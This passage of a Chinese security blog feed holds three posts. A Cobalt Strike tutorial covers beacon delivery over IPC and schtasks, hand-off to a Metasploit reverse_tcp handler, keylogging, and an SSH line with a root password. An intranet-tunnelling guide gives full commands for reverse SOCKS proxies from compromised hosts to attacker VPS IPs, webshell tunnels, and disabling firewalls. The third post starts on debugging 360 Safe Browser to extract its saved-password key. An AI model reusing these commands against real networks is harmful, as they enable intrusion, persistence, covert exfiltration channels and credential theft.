src="/img/CobalStrikeLiteracy/0.8974812485398633.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.32524435229508597.png" alt="img"></p><p>Stage选择zhongzhuan，output选择exe，然后会生成一个beacon.exe</p><p><img src="/img/CobalStrikeLiteracy/0.5106082009923364.png" alt="img"></p><p>通过net use和不出网的内网机器建立IPC连接，然后将beacon.exe 复制到目标机器里，再使用计划任务schtasks执行beacon.exe即可上线</p><p><img src="/img/CobalStrikeLiteracy/0.9823994953797551.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.7953847017401188.png" alt="img"></p><p>成功上线</p><p><img src="/img/CobalStrikeLiteracy/0.21118317239101586.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.9080092441580215.png" alt="img"></p><h2 id="0x08-联动MSF"><a href="#0x08-联动MSF" class="headerlink" title="0x08 联动MSF"></a>0x08 联动MSF</h2><p>msf监听</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost set lport run</code></pre><p><img src="/img/CobalStrikeLiteracy/0.9925311858482716.png" alt="img"></p><p>创建一个监听器，ip和port设置为msf的ip和port</p><p><img src="/img/CobalStrikeLiteracy/0.9281324896355443.png" alt="img"></p><p>目标机器右键spawn</p><p><img src="/img/CobalStrikeLiteracy/0.1054484216844525.png" alt="img"></p><p>选择msf监听器</p><p><img src="/img/CobalStrikeLiteracy/0.44625564552911096.png" alt="img"></p><p>msf成功上线</p><p><img src="/img/CobalStrikeLiteracy/0.7665290584580648.png" alt="img"></p><h2 id="0x09-屏幕截图和键盘记录"><a href="#0x09-屏幕截图和键盘记录" class="headerlink" title="0x09 屏幕截图和键盘记录"></a>0x09 屏幕截图和键盘记录</h2><p>屏幕截图</p><p><img src="/img/CobalStrikeLiteracy/2d6ff6d6-a5b8-4169-84cc-a849b171d98a.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/d0cf3ab6-c82f-4628-a70a-9d2c0a2f033c.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/6f68852c-9ca9-42cd-8bd5-e6d1bc43ddfe.png" alt="img"></p><p>键盘记录</p><p>列出进程</p><p><img src="/img/CobalStrikeLiteracy/f82b0bfe-c88e-4897-83a4-93cc3997b560.png" alt="img"></p><p>选择全部</p><p><img src="/img/CobalStrikeLiteracy/4959af83-e744-4e3a-be57-ea62d284a959.png" alt="img"></p><p>等加载完</p><p><img src="/img/CobalStrikeLiteracy/0290b9d8-5ccb-44b0-9376-86ce1c266634.png" alt="img"></p><p>目标输入</p><p><img src="/img/CobalStrikeLiteracy/8a1a893d-5d44-4171-b608-ffba8930545c.png" alt="img"></p><p>成功记录</p><p><img src="/img/CobalStrikeLiteracy/f64438ab-5b51-4c22-98f4-9c2ae01322b3.png" alt="img"></p><h2 id="0x010-Linux上线"><a href="#0x010-Linux上线" class="headerlink" title="0x010 Linux上线"></a>0x010 Linux上线</h2><pre><code>ssh 172.16.200.30:22 root Huawei12#$</code></pre><p><img src="/img/CobalStrikeLiteracy/84d1bbd8-e8ff-4b27-8789-f72df2479c74.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CobalStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobalStrike扫盲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="/2020/11/27/nei-wang-chuan-tou/"/>
      <url>/2020/11/27/nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="0x00-环境-工具"><a href="#0x00-环境-工具" class="headerlink" title="0x00 环境-工具"></a>0x00 环境-工具</h2><h3 id="0x00-1-靶场介绍"><a href="#0x00-1-靶场介绍" class="headerlink" title="0x00-1 靶场介绍"></a>0x00-1 靶场介绍</h3><p>以下端口转发和代理都是自己的VPS做演练。</p><pre><code>Linux：      207.148.119.98Windows:     45.76.153.192</code></pre><h3 id="0x00-2用到的转发-代理工具"><a href="#0x00-2用到的转发-代理工具" class="headerlink" title="0x00-2用到的转发|代理工具:"></a>0x00-2用到的转发|代理工具:</h3><pre><code>ssf             https://www.ctolib.com/article/releases/68618abptts          https://github.com/nccgroup/ABPTTSearthworm       http://rootkiter.com/EarthWormfrp             https://github.com/fatedier/frpNeo-reGeorg     https://github.com/L-codes/Neo-reGeorgreDuh           https://github.com/sensepost/reDuhVenom           https://github.com/Dliv3/Venom                https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z</code></pre><h3 id="0x00-3-流量代理工具"><a href="#0x00-3-流量代理工具" class="headerlink" title="0x00-3 流量代理工具"></a>0x00-3 流量代理工具</h3><pre><code>proxifier       https://www.proxifier.comproxychains     apt install proxychains</code></pre><h2 id="0x01-netsh端口转发"><a href="#0x01-netsh端口转发" class="headerlink" title="0x01 netsh端口转发"></a>0x01 netsh端口转发</h2><p>条件：管理员权限    用windows自带的netsh</p><pre><code>netsh firewall show config              查看防火墙配置netsh firewall show state               查看当前系统防火墙状态 netsh interface portproxy show all      查看端口转发</code></pre><p><img src="/img/NAT/5131e65c-49c2-4a36-83ba-137cc88b0c09.png" alt="img"></p><p><img src="/img/NAT/4a12db30-9512-4527-83e1-d9a58caf8c35.png" alt="img"></p><p><img src="/img/NAT/98b51d48-07ac-4e13-af0b-f6d7cacf295e.png" alt="img"></p><p><img src="/img/NAT/2bd37ada-a395-4515-b670-689722a93c08.png" alt="img"></p><pre><code>把来自外部的 tcp 的 10086 端口流量全部转发到内网机器的 3389 端口上 建立规则：netsh advfirewall firewall add rule name=&quot;aaaaaa&quot; dir=in action=allow protocol=TCP localport=10086netsh interface portproxy add v4tov4 listenport=10086 connectaddress=127.0.0.1 connectport=3389netsh firewall show statenetsh interface portproxy show all删除规则：netsh advfirewall firewall delete rule name=&quot;aaaaaa&quot; dir=in protocol=TCP localport=10086netsh interface portproxy delete v4tov4 listenport=10086netsh firewall show statenetsh interface portproxy show all</code></pre><p><img src="/img/NAT/ea3de34d-1253-4cd4-b44c-53b6fa76b434.png" alt="img"></p><p><img src="/img/NAT/9bccef79-9834-44e7-abdc-196d5e6f8087.png" alt="img"></p><p>远程登陆连接目标IP:10086端口</p><p><img src="/img/NAT/0537afc6-346d-44a2-bfde-248a01e54abb.png" alt="img"></p><pre><code>a) 关于 netsh 在 2003 下的操作命令相对于之后的系统有所不同,这里稍微注意下 # netsh firewall show state  查看当前系统防火墙状态 # netsh firewall set opmode disable 关闭当前系统防火墙 # netsh firewall set opmode enable 启用当前系统防火墙b) 对于 2003 以后的系统,可使用如下的命令管理防火墙 # netsh advfirewall show allprofiles    查看当前系统所有网络类型的防火墙状态,比如,私有,公共,域网络 # netsh advfirewall set allprofiles state off  关闭当前系统防火墙 # netsh advfirewall set allprofiles state on  启用当前系统防火墙 # netsh advfirewall reset        重置当前系统的所有防火墙规则,会初识到刚装完系统的状态 # netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; 自定义防火墙日志位置 add 为增加规则,delete 为删除规则 allow 为允许连接, block 为阻断连接 in 为入站,out 为出站 name 为要显示的规则名称</code></pre><h2 id="0x02-ssf正反向跨平台socks代理"><a href="#0x02-ssf正反向跨平台socks代理" class="headerlink" title="0x02 ssf正反向跨平台socks代理"></a>0x02 ssf正反向跨平台socks代理</h2><pre><code>反向代理：将ssf.exe和certs文件夹传到靶机里，然后在ssf.exe的目录下运行程序正向代理：将ssfd.exe和certs文件夹传到靶机里，然后在ssfd.exe的目录下运行程序</code></pre><h3 id="0x02-1-SSF-反向-socks-代理"><a href="#0x02-1-SSF-反向-socks-代理" class="headerlink" title="0x02-1 SSF 反向 socks 代理"></a>0x02-1 SSF 反向 socks 代理</h3><pre><code>靶机       Linux      207.148.119.98攻击机     Windows    45.76.153.192        安装proxifier做socks代理 </code></pre><pre><code>第一步：本地监听1050端口 ssfd.exe -p 1050./ssfd -p 1050</code></pre><p><img src="/img/NAT/3a3bec3f-2289-4b85-8e9b-59fc2e771fcd.png" alt="img"></p><pre><code>第二步：目标边界连接我们的1050端口，并将数据转发给1051端口ssf.exe -F 1051 -p 1050 45.76.153.192./ssf -F 1051 -p 1050 45.76.153.192</code></pre><p><img src="/img/NAT/25adbb09-cc30-4d3b-82d5-0fe5e34960e8.png" alt="img"></p><p><img src="/img/NAT/65364b36-5ed7-473d-87e7-699a21c050ff.png" alt="img"></p><pre><code>第三步：本地proxifier代理本地127.0.0.1的1051端口</code></pre><p><img src="/img/NAT/a5873ff9-3d30-4615-9ad5-7a45c763142b.png" alt="img"></p><pre><code>第四步：成功代理上目标边界，现在即可访问内网</code></pre><p><img src="/img/NAT/f12f1aa2-b4d5-45f2-b5fe-1320535b1315.png" alt="img"></p><h3 id="0x02-2-SSF-正向-socks-代理"><a href="#0x02-2-SSF-正向-socks-代理" class="headerlink" title="0x02-2 SSF 正向 socks 代理"></a>0x02-2 SSF 正向 socks 代理</h3><p>为什么要讲正向代理呢，要是目标的防火墙设置比较严，只准进不准出，而我们又没有权限更改防火墙规则</p><p>那么我们就可以可以正向socks代理进去</p><pre><code>靶机       45.76.153.192          ssfd.exe -p 1050                        监听攻击机     207.148.119.98         ./ssf -D 1051 -p 1050 45.76.153.192      正向连接</code></pre><pre><code>第一步：目标边界监听1050端口 ssfd.exe -p 1050./ssfd -p 1050</code></pre><p><img src="/img/NAT/c962aa91-062b-4006-8ee5-b50b0abffb6f.png" alt="img"></p><pre><code>第二步：攻击机连接目标边界的1050端口，并将数据转发给1051端口ssf.exe -D 1051 -p 1050 45.76.153.192./ssf -D 1051 -p 1050 45.76.153.192</code></pre><p><img src="/img/NAT/11b10c38-4aa9-4c18-b9c2-f48222af1f44.png" alt="img"></p><pre><code>第三步：本地proxifier代理本地127.0.0.1的1051端口</code></pre><h2 id="0x03-abptts正向端口转发"><a href="#0x03-abptts正向端口转发" class="headerlink" title="0x03 abptts正向端口转发"></a>0x03 abptts正向端口转发</h2><pre><code>靶机       45.76.153.192          放置webshell攻击机     207.148.119.98         python abpttsclient.py -c webshell/config.txt -u &quot;http://45.76.153.192/abptts.jsp&quot; -f 127.0.0.1:33389/127.0.0.1:3389</code></pre><h3 id="0x03-1-安装"><a href="#0x03-1-安装" class="headerlink" title="0x03-1 安装"></a>0x03-1 安装</h3><pre><code>git clone  https://github.com/nccgroup/ABPTTS.gitapt install python-setuptoolsapt install python-pippip install --upgrade pippython -m pip install pycryptopython -m pip install pycryptodomepython -m pip install httplib2cd ABPTTSpython abpttsfactory.py -o webshell</code></pre><p><img src="/img/NAT/09e9c199-9f9a-4ca6-8d89-40f95bd20e86.png" alt="img"></p><p><img src="/img/NAT/fa399938-7c2a-46fd-8fe5-48db061c79ad.png" alt="img"></p><h2 id="0x02-目标边界上传脚本"><a href="#0x02-目标边界上传脚本" class="headerlink" title="0x02 目标边界上传脚本"></a>0x02 目标边界上传脚本</h2><p><img src="/img/NAT/1e66344f-3788-45b1-b67c-973c3cbb76a8.png" alt="img"></p><h2 id="0x03-攻击机连接"><a href="#0x03-攻击机连接" class="headerlink" title="0x03 攻击机连接"></a>0x03 攻击机连接</h2><pre><code>命令格式：python abpttsclient.py -c webshell/config.txt -u &quot;http://192.168.1.119/abptts.aspx&quot; -f 本地内网IP:本地端口/目标边界内网IP:需要转发的目标边界的端口# 将目标边界的3389转发到本地的33389端口上python abpttsclient.py -c webshell/config.txt -u &quot;http://45.76.153.192/abptts.jsp&quot; -f 127.0.0.1:33389/127.0.0.1:3389</code></pre><p><img src="/img/NAT/bb8e1084-840b-4125-8444-c1e5ad0cbebf.png" alt="img"></p><p><img src="/img/NAT/f094d308-1f11-4437-9138-4178a8d7b7c1.png" alt="img"></p><h2 id="0x04-earthworm正反向跨平台socks代理"><a href="#0x04-earthworm正反向跨平台socks代理" class="headerlink" title="0x04 earthworm正反向跨平台socks代理"></a>0x04 earthworm正反向跨平台socks代理</h2><pre><code>ew_for_Win.exe-h 查看帮助-s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran)ssocksd：正向socks5代理连接;rcsocks、rssocks：反向socks5代理连接;lcx_slave、lcx_listen：端口转发;lcx_tran：端口映射;-l 开放指定端口监听;-d 指定转发或反弹的主机地址；-e 指定转发或反弹的主机端口；-f 指定连接或映射的主机地址；-g 指定连接或映射的主机端口；-t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，-h显示有误)；-v 显示版本；-a 显示关于页面；正向代理    ssocksd反向代理    rcsocks,rssocks端口转发    lcx_listen,lcx_slave,lcx_tran</code></pre><h3 id="0x04-1-反向socks代理"><a href="#0x04-1-反向socks代理" class="headerlink" title="0x04-1 反向socks代理"></a>0x04-1 反向socks代理</h3><pre><code>攻击机：     45.76.153.192       ew_for_Win.exe -s rcsocks -l 1080 -e 53             监听目标边界：   207.148.119.98      ew_for_Win.exe -s rssocks -d 45.76.153.192 -e 53    反向连接</code></pre><p>攻击机监听：</p><p><img src="/img/NAT/0daa9796-1a70-478b-8872-58a4d445e67e.png" alt="img"></p><p>目标边界反弹：</p><p><img src="/img/NAT/d22ce0f5-1afb-4b68-88cb-164e160ca3ea.png" alt="img"></p><p>攻击机成功收到</p><p><img src="/img/NAT/37b3dcbf-60ff-4f2e-a226-67c1aa7531f8.png" alt="img"></p><p>proxifier代理</p><p><img src="/img/NAT/733c4164-81f2-4bd0-b99b-32ed1bc517f2.png" alt="img"></p><h3 id="0x04-2-正向socks代理"><a href="#0x04-2-正向socks代理" class="headerlink" title="0x04-2 正向socks代理"></a>0x04-2 正向socks代理</h3><pre><code>目标边界：   45.76.153.192       ew_for_Win.exe -s ssocksd -l 10085      开启监听攻击机：     207.148.119.98      proxifier或者proxychains代理           45.76.153.192 10085</code></pre><p>目标边界监听</p><p><img src="/img/NAT/fe790c1a-1c5e-4367-ace7-486ca3cb64d5.png" alt="img"></p><p>攻击机配置代理</p><pre><code>vi /etc/proxychains.confsocks5 45.76.153.192 10085</code></pre><p><img src="/img/NAT/9c4c811f-0960-49ed-957a-a94629811980.png" alt="img"></p><p>攻击机使用代理执行命令</p><pre><code>proxychains curl http://ip-api.com/json/?lang=zh-CN</code></pre><p>成功代理</p><p><img src="/img/NAT/4f8ad7be-77d1-4f37-9b78-0375635b6359.png" alt="img"></p><h2 id="0x05-frp反向socks代理"><a href="#0x05-frp反向socks代理" class="headerlink" title="0x05 frp反向socks代理"></a>0x05 frp反向socks代理</h2><h3 id="0x05-1-工具下载地址"><a href="#0x05-1-工具下载地址" class="headerlink" title="0x05-1 工具下载地址"></a>0x05-1 工具下载地址</h3><pre><code>https://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_windows_amd64.ziphttps://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_windows_386.ziphttps://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_amd64.tar.gzhttps://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_386.tar.gz</code></pre><h3 id="0x05-2-反向代理"><a href="#0x05-2-反向代理" class="headerlink" title="0x05-2 反向代理"></a>0x05-2 反向代理</h3><pre><code>攻击机：        45.76.153.192         frps.exe -c frps.ini        开启监听目标边界：      207.148.119.98        ./frpc -c frpc.ini          反向连接</code></pre><p>攻击机监听：</p><pre><code>攻击机先配置frps.ini文件# frps.ini[common]bind_addr = 0.0.0.0bind_port = 7000token = www.nat.ee开始监听frps.exe -c frps.ini[common]bind_addr = 0.0.0.0bind_port = 7000</code></pre><p><img src="/img/NAT/5b59904d-1e77-45f1-bb37-f64f882fbc06.png" alt="img"></p><p><img src="/img/NAT/392fcaf1-2018-46c4-b777-4f0dc5b743e8.png" alt="img"></p><p>目标边界反向连接</p><pre><code>目标边界先配置frpc.ini文件# frpc.ini[common]server_addr = 45.76.153.192         # 自己公网VPS的IPserver_port = 7000                  # 自己公网VPS监听的端口token = www.nat.ee                  # 必须得有，否则会authorization failed[http_proxy]type = tcp#local_ip = 127.0.0.1#local_port = 22remote_port = 8010                  # 公网VPS的proxifier设置的端口plugin = socks5                     # 使用插件socks代理plugin_user = abc                   # proxifier连接的账号密码plugin_passwd = abc执行反向连接命令：./frpc -c frpc.ini[common]server_addr = 45.76.153.192server_port = 7000[http_proxy]type = tcpremote_port = 8010plugin = socks5</code></pre><p><img src="/img/NAT/cf200062-acd3-4ad5-a12a-39ab37b8afd8.png" alt="img"></p><p><img src="/img/NAT/c1b2b2f2-fedf-49e1-9194-dfe9b8e3c52f.png" alt="img"></p><p>攻击机成功收到</p><p><img src="/img/NAT/18fe4112-44da-47c0-9e16-c650e07d1ffb.png" alt="img"></p><pre><code>proxifier设置45.76.153.192 8010并输入账号密码 abc abc</code></pre><p><img src="/img/NAT/33feaf3d-a125-43c2-8f9e-bb4e6981e59d.png" alt="img"></p><p>成功代理</p><p><img src="/img/NAT/52fd1ffc-943b-4163-9f0f-5f32d7db1438.png" alt="img"></p><h2 id="0x06-Neo-reGeorg正向socks代理"><a href="#0x06-Neo-reGeorg正向socks代理" class="headerlink" title="0x06 Neo-reGeorg正向socks代理"></a>0x06 Neo-reGeorg正向socks代理</h2><pre><code>目标边界：      45.76.153.192         放置webshell攻击机：        207.148.119.98        python neoreg.py -k 123456 -u http://45.76.153.192:8080/tunnel.jsp</code></pre><h3 id="0x06-1-webshell生成"><a href="#0x06-1-webshell生成" class="headerlink" title="0x06-1 webshell生成"></a>0x06-1 webshell生成</h3><pre><code>python neoreg.py generate -k 123456</code></pre><p><img src="/img/NAT/3bf62c09-2832-4f42-98f6-4c55e2440be0.png" alt="img"></p><h3 id="0x06-2-目标边界上传脚本"><a href="#0x06-2-目标边界上传脚本" class="headerlink" title="0x06-2 目标边界上传脚本"></a>0x06-2 目标边界上传脚本</h3><p><img src="/img/NAT/fe74b5f5-a42f-4507-8aa4-7f47c4970da8.png" alt="img"></p><h3 id="0x06-3-攻击机连接"><a href="#0x06-3-攻击机连接" class="headerlink" title="0x06-3 攻击机连接"></a>0x06-3 攻击机连接</h3><pre><code>使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理python neoreg.py -k 123456 -u http://45.76.153.192:8080/tunnel.jsp</code></pre><p><img src="/img/NAT/5d179485-ab63-4db1-bb2c-2f4ccdc01481.png" alt="img"></p><p>修改proxychains.conf，socks5 127.0.0.1 1080</p><p><img src="/img/NAT/fe96a7f8-6ed9-460f-b271-a97d303e9c55.png" alt="img"></p><p>使用proxychains成功代理上</p><p><img src="/img/NAT/8831e2c5-a62a-4750-a9c6-4b6ef6ec4fd2.png" alt="img"></p><h2 id="0x07-reDuh正向端口转发"><a href="#0x07-reDuh正向端口转发" class="headerlink" title="0x07 reDuh正向端口转发"></a>0x07 reDuh正向端口转发</h2><pre><code>目标边界：      45.76.153.192         放置webshell攻击机：        207.148.119.98        java -jar reduhclient.jar http://目标域名/reduh.php</code></pre><h3 id="0x07-1-目标边界放置webshell"><a href="#0x07-1-目标边界放置webshell" class="headerlink" title="0x07-1 目标边界放置webshell"></a>0x07-1 目标边界放置webshell</h3><p><img src="/img/NAT/7e0cbae9-dd59-4cff-b3da-4765abc8c3d4.png" alt="img"></p><h3 id="0x07-2-攻击机连接"><a href="#0x07-2-攻击机连接" class="headerlink" title="0x07-2 攻击机连接"></a>0x07-2 攻击机连接</h3><pre><code>java -jar reduhclient.jar http://45.76.153.192:8080/reDuh.jsp</code></pre><p><img src="/img/NAT/17115e5c-1a06-4229-bbfa-61f93b5fa6eb.png" alt="img"></p><h3 id="0x07-3-绑定端口-建立隧道"><a href="#0x07-3-绑定端口-建立隧道" class="headerlink" title="0x07-3 绑定端口-建立隧道"></a>0x07-3 绑定端口-建立隧道</h3><pre><code>telnet 127.0.0.1 1010</code></pre><p><img src="/img/NAT/03f76de7-695a-4ec6-95e5-a8b873281c6b.png" alt="img"></p><h3 id="0x07-4-端口转发"><a href="#0x07-4-端口转发" class="headerlink" title="0x07-4 端口转发"></a>0x07-4 端口转发</h3><pre><code>[createTunnel]要绑定到本地哪个端口上[8888]:127.0.0.1:要绑定远程机器上的哪个端口[3389,22] [createTunnel]8888:127.0.0.1:3389</code></pre><p><img src="/img/NAT/e6479ef8-7cd7-43cb-a463-1edb8e6481ae.png" alt="img"></p><p>成功连接</p><p><img src="/img/NAT/d2ae1bc3-37d8-4ae0-b2e8-7a2a1f383df1.png" alt="img"></p><h2 id="0x08-venom反向socks代理"><a href="#0x08-venom反向socks代理" class="headerlink" title="0x08 venom反向socks代理"></a>0x08 venom反向socks代理</h2><pre><code>目标边界：      45.76.153.192         agent.exe -rhost 207.148.119.98 -rport 9999攻击机：        207.148.119.98        ./admin_linux_x86 -lport 9999</code></pre><h3 id="0x08-1-攻击机监听"><a href="#0x08-1-攻击机监听" class="headerlink" title="0x08-1 攻击机监听"></a>0x08-1 攻击机监听</h3><pre><code>./admin_linux_x86 -lport 9999</code></pre><p><img src="/img/NAT/5b0d723b-e387-4a8e-8da1-525f0e808a37.png" alt="img"></p><h3 id="0x08-2-靶机反向连接"><a href="#0x08-2-靶机反向连接" class="headerlink" title="0x08-2 靶机反向连接"></a>0x08-2 靶机反向连接</h3><pre><code>agent.exe -rhost 207.148.119.98 -rport 9999</code></pre><p><img src="/img/NAT/3bf13a8a-8c4e-42c3-a405-1f592aeb2f12.png" alt="img"></p><h3 id="0x08-3-攻击机成功接收"><a href="#0x08-3-攻击机成功接收" class="headerlink" title="0x08-3 攻击机成功接收"></a>0x08-3 攻击机成功接收</h3><p><img src="/img/NAT/2a851af9-7446-4d2f-8d78-5b5e24377d65.png" alt="img"></p><pre><code>show                展现节点goto 1              进入节点1socks 6666          做socks代理，代理只需要连接207.148.119.98 6666即可代理上45.76.153.192shell               进入交互式终端执行命令</code></pre><p><img src="/img/NAT/3d6699df-79a0-4336-a233-68fd4fd4a1dd.png" alt="img"></p><p><img src="/img/NAT/31dbfb20-4485-45cc-8eb1-671ac1885b03.png" alt="img"></p><p>成功代理</p><p><img src="/img/NAT/5efa974e-c268-4cec-92c9-df4785cffc9e.png" alt="img"></p><h2 id="0x09-ssh端口转发和socks代理"><a href="#0x09-ssh端口转发和socks代理" class="headerlink" title="0x09 ssh端口转发和socks代理"></a>0x09 ssh端口转发和socks代理</h2><pre><code>-f 后台运行-C 允许压缩数据-N 不执行任何命令-R 将端口绑定到远程服务器，反向代理-L 将端口绑定到本地客户端，正向代理</code></pre><p>下面的例子里，ssh端口是5510</p><p>60.247.XXX.XXX 香港VPS    模拟外网VPS</p><p>122.114.XXX.XXX 河南郑州VPS    模拟内网服务器</p><h3 id="0x09-1-本地转发"><a href="#0x09-1-本地转发" class="headerlink" title="0x09-1 本地转发"></a>0x09-1 本地转发</h3><pre><code>ssh -fCNL &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;local port：转发到本地的端口remote host：远程服务器的IPremote port：远程服务器的端口SSH hostname：本地服务器的IP或者主机名因为是本地转发，将本地的88端口转发到本地的89端口，所以local port = 89remote host = 127.0.0.1remote port = 88SSH hostname = 127.0.0.1-p参数指向本地服务器ssh的端口在内网的服务器上运行    ssh -fCNL 89:127.0.0.1:88 127.0.0.1 -p 5510    curl http://127.0.0.1:89</code></pre><p><img src="/img/NAT/a1f72ef3-ed08-40ba-89b4-e9844984f2e3.png" alt="img"></p><p>本地转发需要输入当前服务器的密码</p><p><img src="/img/NAT/9174d7e6-001c-4270-b8d3-ba8af8b11f2c.png" alt="img"></p><p>可以看到成功转发</p><p><img src="/img/NAT/6f59907b-429c-4c1b-8c31-636794cb90c5.png" alt="img"></p><h3 id="0x09-2-远程端口转发"><a href="#0x09-2-远程端口转发" class="headerlink" title="0x09-2 远程端口转发"></a>0x09-2 远程端口转发</h3><pre><code>ssh -fCNR &lt;remote port&gt;:&lt;local host&gt;:&lt;local port&gt; &lt;remote host&gt;将local host的local port转发到remote host的remote port提示输入remote host的密码在内网的服务器上（122.114.XXX.XXX）运行, 前提是内网服务器能够ssh到远程服务器60.247.XXX.XXX。将当前服务器的5510端口转发到远程服务器60.247.XXX.XXX的5500端口    ssh -fCNR 5500:127.0.0.1:5510 root@60.247.XXX.XXX -p 5510在外网自己的服务器（60.247.XXX.XXX）上运行，ssh外网自己服务器的5500端口就被转发到了内网服务器的5510端口    ssh root@127.0.0.1 -p 5500</code></pre><p>在内网服务器输入下面命令进行端口转发，需要输入远程服务器的密码</p><p><img src="/img/NAT/9baa60c4-4a31-4257-b9df-6bc4035a417c.png" alt="img"></p><p>远程服务器（60.247.XXX.XXX）输入下面命令，ssh本地的5500端口，就会ssh到内网服务器（122.114.XXX.XXX）去</p><p><img src="/img/NAT/275a8347-8a5d-4df6-8a8f-8d3447ebbe08.png" alt="img"></p><h3 id="0x09-3-socks代理"><a href="#0x09-3-socks代理" class="headerlink" title="0x09-3 socks代理"></a>0x09-3 socks代理</h3><pre><code>建立反向代理呢？其实就是把正向代理和转发结合起来即可前提条件：需要知道内网服务器的密码内网进行端口转发，将本地的ssh端口5510转发到远程的5500端口,需要输入远程服务器的密码    ssh -qngfNTR 5500:localhost:5510 root@60.247.XXX.XXX -p 5510外网进行正向socks代理，ssh连接本地的5500端口，即连接到内网服务器，然后搭建正向socks代理。代理端口为6767，需要输入内网服务器的密码    ssh -qngfNTD 6767 root@127.0.0.1 -p 5500</code></pre><p>在内网输入下面命令，将内网的ssh端口转发到外网服务器的某个端口上</p><p><img src="/img/NAT/8e3cae36-15e6-4d2e-91b6-49e65b1aae40.png" alt="img"></p><p>在外网的服务器输入下面命令，ssh连接本地的5500端口，即连接到内网服务器，然后搭建正向socks代理，socks端口为6767，需要输入内网服务器的密码</p><p><img src="/img/NAT/5a356b79-6a9d-43bd-8e5c-16aa83767acc.png" alt="img"></p><p>proxifier连接远程服务器的6767端口</p><p><img src="/img/NAT/eded93a8-6b94-45c5-b423-0945320a8afc.png" alt="img"></p><h3 id="0x09-4-删除端口转发"><a href="#0x09-4-删除端口转发" class="headerlink" title="0x09-4 删除端口转发"></a>0x09-4 删除端口转发</h3><pre><code>ps aux | grep sshkill &lt;id&gt;kill -9 &lt;id&gt;</code></pre><p><img src="/img/NAT/bd1181ea-413a-4aa1-a8bb-ab5f7b0079fe.png" alt="img"></p><h2 id="0x10-多层代理"><a href="#0x10-多层代理" class="headerlink" title="0x10 多层代理"></a>0x10 多层代理</h2><p><img src="/img/NAT/66528187.png" alt="img"></p><p><img src="/img/NAT/35693890.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态调试360安全浏览器获取密钥</title>
      <link href="/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/"/>
      <url>/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/</url>
      
        <content type="html"><![CDATA[<h1 id="动态调试360安全浏览器获取密钥"><a href="#动态调试360安全浏览器获取密钥" class="headerlink" title="动态调试360安全浏览器获取密钥"></a>动态调试360安全浏览器获取密钥</h1><p><img src="/img/360SafeBrowser/28edde14-bc20-4f6d-a3e2-90d61e7d4093.png" alt="img"></p><p>按F9开启调试</p><p><img src="/img/360SafeBrowser/c6a9bd27-653c-4000-a59a-d4c427beb610.png" alt="img"></p><p>将启动的所有的异常都忽略，不然总是暂停</p><p><img src="/img/360SafeBrowser/8c02793e-6d28-4749-99b9-e8177b8d016e.png" alt="img"></p><p><img src="/img/360SafeBrowser/3316bb99-5a8b-4834-841d-604786c2b753.png" alt="img"></p><p>这样就不会因为异常暂停了，直接就打开了360安全浏览器</p><p><img src="/img/360SafeBrowser/7521b024-57b7-44e7-bb0b-d79dcafebd5d.png" alt="img"></p><p><img src="/img/360SafeBrowser/3557fbcb-b98e-46f7-8ce6-d834e60deadb.png" alt="img"></p><p>因为浏览器保存了账号密码，刚才打开网站时自动填充了密码，那么这个过程中的字符串肯定都被x32dbg保存着了。于是在所有模块的字符串里搜索password等可能会存在的关键字符串去定位解密的输入点，然后断点调试。</p><p><img src="/img/360SafeBrowser/c6bed575-d28d-4023-96cb-ce236e7cdbcd.png" alt="img"></p><p><img src="/img/360SafeBrowser/1fb574ae-d7de-4794-831b-502fed4d177d.png" alt="img"></p><p>双击跟入，在688C530B下断点，双击右侧空白处可以添加注释</p><p><img src="/img/360SafeBrowser/445b96d4-5bb2-4daa-a54b-973e20e65edf.png" alt="img"></p><p>进入到解密的函数里，可以如下图操作进入，也可以按回车进入</p><p><img src="/img/360SafeBrowser/3418d97e-3f45-4e61-989a-25377abf0687.png" alt="img"></p><p><img src="/img/360SafeBrowser/79eb9701-7f70-40e2-a425-cf15beb5cfeb.png" alt="img"></p><p>然后重新按F9让程序跑完，然后刷新浏览器页面</p><p><img src="/img/360SafeBrowser/6c64d98b-39b9-4ea6-9a06-4b83a59e0e20.png" alt="img"></p><p><img src="/img/360SafeBrowser/744152db-0da6-4aa3-bd6e-cb3b34e0980a.png" alt="img"></p><p>按F8步过调试</p><p><img src="/img/360SafeBrowser/d4b5455f-056f-4b94-9475-d33860c95995.png" alt="img"></p><p>设置断点后，回车跟入</p><p><img src="/img/360SafeBrowser/39514d23-7832-40d8-99a8-58a15a2e863b.png" alt="img"></p><p>设置断点</p><p><img src="/img/360SafeBrowser/be67cb69-a035-4cb0-a5bb-1afc2d5e3c65.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691FE582断点处</p><p><img src="/img/360SafeBrowser/329097e4-5d2a-4e42-94bd-34b238890f4a.png" alt="img"></p><p><img 